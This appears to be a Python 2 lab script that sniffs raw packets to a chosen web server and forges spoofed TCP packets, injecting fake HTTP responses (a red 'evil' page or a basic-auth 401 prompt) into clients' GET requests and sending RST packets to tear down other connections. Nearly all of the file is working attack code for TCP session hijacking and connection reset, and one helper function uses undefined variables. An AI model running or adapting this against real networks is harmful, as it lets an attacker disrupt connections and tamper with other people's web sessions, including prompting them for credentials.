# encoding:utf8
import struct, socket, sys, time, datetime
from thread import *
import common_sock as common_sock


_flags = ['URG', 'ACK', 'PSH', 'RST', 'SYN', 'FIN']
_eth_addr = lambda a: '%.2x:%.2x:%.2x:%.2x:%.2x:%.2x' % (ord(a[0]), ord(a[1]), ord(a[2]), ord(a[3]), ord(a[4]), ord(a[5]) )

_send_fmt1 = '@32m %s @90m %s %s:%s @34m to %s %s:%s @39m'.replace('@', '\033[')
_send_fmt2 = '@32m seq@34m %10s @32mack@96m %10s @32mexpAck@34m %10s @32mflags@97m %s @32mtcp_dlen@33m %s @39m'.replace('@', '\033[')
_recv_fmt1 = '@32m %s @90m %s %s:%s @96m from %s %s:%s @39m'.replace('@','\033[')
_recv_fmt2 = '@32m seq@96m %10s @32mack@34m %10s @32mexpAck@96m %10s @32mflags@97m %s @32mtcp_dlen@33m %s @39m'.replace('@', '\033[')

specFlags = ['RST', 'SYN', 'FIN']
specColorZip = zip(specFlags, [41, 42, 45])

response_body_401 = '''
<body style="background-color:red">
    <h1>BING~Oo!</h1>
    <p>Und wenn du lange in einen Abgrund blickst, blickt der Abgrund auch in dich hinein.</p>
</body>
'''
inject_401 = '\r\n'.join([
'HTTP/1.1 401 Unauthorized',
'X-Powered-By: evil',
'Content-Type: text/html; charset=utf-8',
'Content-Length: ' + str(len(response_body_401)),
'Connection: keep-alive',
'WWW-Authenticate: basic',
'',
response_body_401
])

response_body_200 = '''
<body style="background-color:red">
    <h1>WAIT!</h1>
    <p>Here is an asking from the evil.</p>
</body>
'''
inject_200 = '\r\n'.join([
'HTTP/1.1 200 OK',
'X-Powered-By: evil',
'Content-Type: text/html; charset=utf-8',
'Content-Length: ' + str(len(response_body_200)),
'Connection: keep-alive',
'',
response_body_200
])

def printSend(obj):
    print _send_fmt1 % (obj['timestamp'], obj['s_mac'], obj['s_ip'], obj['s_port'], obj['d_mac'], obj['d_ip'], obj['d_port'])
    print _send_fmt2 % (obj['seq'], obj['ack'], obj['seq'] + obj['tcp_dlen'] + obj['addone'], obj['flags'], obj['tcp_dlen'])


def printRecv(obj):
    print _recv_fmt1 % (obj['timestamp'], obj['d_mac'], obj['d_ip'], obj['d_port'], obj['s_mac'], obj['s_ip'], obj['s_port'])
    print _recv_fmt2 % (obj['seq'], obj['ack'], obj['seq'] + obj['tcp_dlen'] + obj['addone'], obj['flags'], obj['tcp_dlen'])


def analyzePacket(packet, myfilter):
    eth_hlen = 14

    ip_hdata = packet[eth_hlen : 20 + eth_hlen]
    ip_hdata = struct.unpack('!BBHHHBBH4s4s', ip_hdata)

    ip_hlen = ip_hdata[0] << 2 & 0x3C
    ip_dlen = ip_hdata[2]

    tcp_hdata = packet[eth_hlen + ip_hlen : eth_hlen + ip_hlen + 20]
    tcp_hdata = struct.unpack('!HHLLBBHHH', tcp_hdata)

    tcp_hlen = tcp_hdata[4] >> 2 & 0xFC
    tcp_dlen = ip_dlen - ip_hlen - tcp_hlen

    tcp_data = packet[eth_hlen + ip_hlen + tcp_hlen : eth_hlen + ip_dlen]

    if tcp_dlen <= 0:
        return None

    d_mac = _eth_addr(packet[0:6])
    s_mac = _eth_addr(packet[6:12])
    s_ip = socket.inet_ntoa(ip_hdata[8])
    d_ip = socket.inet_ntoa(ip_hdata[9])
    s_port = tcp_hdata[0]
    d_port = tcp_hdata[1]

    #
    # filter
    #
    if (d_mac, d_ip, d_port) not in myfilter['descartes'] and (s_mac, s_ip, s_port) not in myfilter['descartes']:
        return None

    seq = tcp_hdata[2]
    ack = tcp_hdata[3]

    flags = [x for (x, y) in zip(_flags, '{0:08b}'.format(tcp_hdata[5] )[2:] ) if y == '1']

    addone = len([True for x in specFlags if x in flags])
    flagsColor = ([y for x,y in specColorZip if x in flags] or [None])[0]
    if flagsColor:
        flags = '\033[%sm%s\033[49m' % (flagsColor, flags)

    obj = {
        's_mac': s_mac,
        's_ip': s_ip,
        's_port': str(s_port),
        'd_mac': d_mac,
        'd_ip': d_ip,
        'd_port': str(d_port),

        'seq': seq,
        'ack': ack,
        'flags': flags,

        'timestamp': datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        'addone': addone,

        'tcp_dlen': tcp_dlen,
    }

    if s_mac == '00:0c:29:69:ba:f5':
        printSend(obj)
    else:
        printRecv(obj)

    if tcp_dlen > 0 and s_mac not in myfilter['local_mac']:
        evilObj = {
            'source_ip': d_ip,
            'dest_ip': s_ip,
            'source_port': d_port,
            'dest_port': s_port,
            'seq': ack,
            'ack': seq,
            'f_ack': 1,
            'f_psh': 1,
        }

        evilObj = common_sock.getSockObj(evilObj)
        if tcp_data[0:6] == 'GET / ':
            common_sock.sendSockRaw(evilObj, inject_200)
        elif tcp_data[0:9] == 'GET /401 ':
            common_sock.sendSockRaw(evilObj, inject_401)
        else:
            rstObj = {
                'source_ip': s_ip,
                'dest_ip': d_ip,
                'source_port': s_port,
                'dest_port': d_port,
                'seq': seq,
                'ack': ack,
            }
            common_sock.rstTCP(rstObj)

    # print tcp_data
    print

def rstthis(sock):
    sockObj = {
        'source_ip': d_ip,
        'dest_ip': s_ip,
        'source_port': d_port,
        'dest_port': s_port,
        'seq': ack,
        'ack': seq+tcp_dlen,
    }
    common_sock.rstTCP(sockObj)


def descartesfilter(myfilter):
    import itertools

    myfilter['local_mac'] = [x.lower() for x in myfilter['local_mac']]
    myfilter['local_port'] = [int(x) for x in myfilter['local_port']]
    descartes = itertools.product(myfilter['local_mac'], myfilter['local_ip'], myfilter['local_port'])

    return [x for x in descartes]


def main(myfilter):
    try:
        sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(0x0003))
    except socket.error, msg:
        print 'Socket could not be created. Error:', msg[0], ' Message:', msg[1]
        return

    myfilter['descartes'] = descartesfilter(myfilter)

    print
    print '---------', myfilter['descartes'], '---------'
    print

    while True:
        try:
            packet = sock.recvfrom(65565)
            packet = packet[0]
            if packet[12:14] != '\x08\x00' or packet[23] != '\x06': # not IP # not TCP
                pass
            else:
                analyzePacket(packet, myfilter)

        except Exception, msg:
            import traceback
            print traceback.format_exc()



#                           #
#            TEST           #
#                           #
#        Python 2.7.3       #
#         CentOS 6.5        #

if __name__ == '__main__':

    myfilter = {
        'local_mac': ['00:0C:29:69:BA:F5'],
        'local_ip': ['192.168.152.131'], # all these ip will be injected
        'local_port': [80], # all these port will be injected
    }

    main(myfilter)
